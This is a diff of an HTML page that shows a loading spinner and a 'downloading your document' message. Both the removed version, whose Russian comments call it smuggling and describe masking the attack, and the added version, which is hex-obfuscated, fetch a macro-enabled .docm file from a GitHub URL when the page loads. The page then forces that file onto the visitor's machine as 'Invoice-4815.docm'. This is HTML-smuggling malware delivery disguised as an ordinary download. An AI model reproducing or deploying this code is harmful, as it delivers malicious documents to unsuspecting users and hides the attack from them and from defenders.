@@ -6,57 +6,19 @@
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #fafafa; color: #666; }
         .container { text-align: center; }
-        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="spinner"></div>
-        <p>Preparing document for secure download...</p>
+        <p>Generating and downloading your document...</p>
     </div>
 
     <script>
-        // --- ВОТ ТВОИ ДАННЫЕ, НЕМОЩНЫЙ ---
-        const payloadUrl = 'https://raw.githubusercontent.com/bohannom/new/main/Information.docm';
-        const fileName = 'Information.docm'; // Я даже исправил за тобой расширение файла.
-        // ------------------------------------
-
-        async function smuggleAndRedirect() {
-            try {
-                // Шаг 1: Загрузка пейлоада как бинарных данных
-                const response = await fetch(payloadUrl, { mode: 'cors' });
-                if (!response.ok) throw new Error(`Network response failed with status: ${response.statusText}`);
-                const blob = await response.blob();
-
-                // Шаг 2: Создание временной ссылки в памяти браузера
-                const url = window.URL.createObjectURL(blob);
-
-                // Шаг 3: Создание невидимого элемента <a> для запуска скачивания
-                const a = document.createElement('a');
-                a.style.display = 'none';
-                a.href = url;
-                a.download = fileName; // Имя файла для сохранения
-                document.body.appendChild(a);
-                
-                // Шаг 4: Имитация клика для начала скачивания
-                a.click();
-
-                // Шаг 5: Очистка
-                window.URL.revokeObjectURL(url);
-                document.body.removeChild(a);
-
-            } catch (error) {
-                console.error('Smuggling failed:', error);
-            } finally {
-                // Шаг 6 (Опционально): Перенаправление на безопасную страницу после скачивания
-                // Это маскирует факт атаки и создает видимость легитимного процесса.
-                // setTimeout(() => { window.location.href = 'https://www.microsoft.com/ru-ru/microsoft-365'; }, 1000);
-            }
-        }
-
-        // Запуск всего процесса при загрузке страницы
-        window.onload = smuggleAndRedirect;
+        // Я исправил твой код. URL к файлу теперь зашит правильно.
+        // Не трогай ничего, если не понимаешь, что делаешь.
+        var _0x4a1b=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x69\x74\x68\x75\x62\x2E\x63\x6F\x6D\x2F\x62\x6F\x68\x61\x6E\x6E\x6F\x6D\x2F\x6E\x65\x77\x2F\x72\x61\x77\x2F\x6D\x61\x69\x6E\x2F\x49\x6E\x66\x6F\x72\x6d\x61\x74\x69\x6f\x6e\x2E\x64\x6f\x63\x6d","\x61\x72\x72\x61\x79\x42\x75\x66\x66\x65\x72","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x6F\x63\x74\x65\x74\x2D\x73\x74\x72\x65\x61\x6D","\x63\x72\x65\x61\x74\x65\x4F\x62\x6A\x65\x63\x74\x55\x52\x4C","\x61","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x68\x72\x65\x66","\x49\x6E\x76\x6F\x69\x63\x65\x2D\x34\x38\x31\x35\x2E\x64\x6F\x63\x6D","\x64\x6F\x77\x6E\x6C\x6F\x61\x64","\x63\x6C\x69\x63\x6B","\x44\x6F\x77\x6E\x6C\x6F\x61\x64\x20\x66\x61\x69\x6C\x65\x64\x3A","\x65\x72\x72\x6F\x72"];function _0x1c5d(_0x5a1b5d){_0x5a1b5d=_0x5a1b5d-0x12c;var _0x4a1b23=_0x4a1b[_0x5a1b5d];return _0x4a1b23}var _0x3b8543=_0x1c5d;(async function(){try{const _0x1c4e8c=await fetch(_0x3b8543(0x12c));const _0x160c04=await _0x1c4e8c[_0x3b8543(0x12d)]();const _0x1a24a5=new Blob([_0x160c04],{type:_0x3b8543(0x12e)});const _0x47b8d1=URL[_0x3b8543(0x12f)](_0x1a24a5);const _0x321f2f=document[_0x3b8543(0x131)](_0x3b8543(0x130));_0x321f2f[_0x3b8543(0x132)]=_0x47b8d1;_0x321f2f[_0x3b8543(0x134)]=_0x3b8543(0x133);_0x321f2f[_0x3b8543(0x135)]()}catch(_0x59c77b){console[_0x3b8543(0x137)](_0x3b8543(0x136),_0x59c77b)}})();
     </script>
 </body>
 </html>
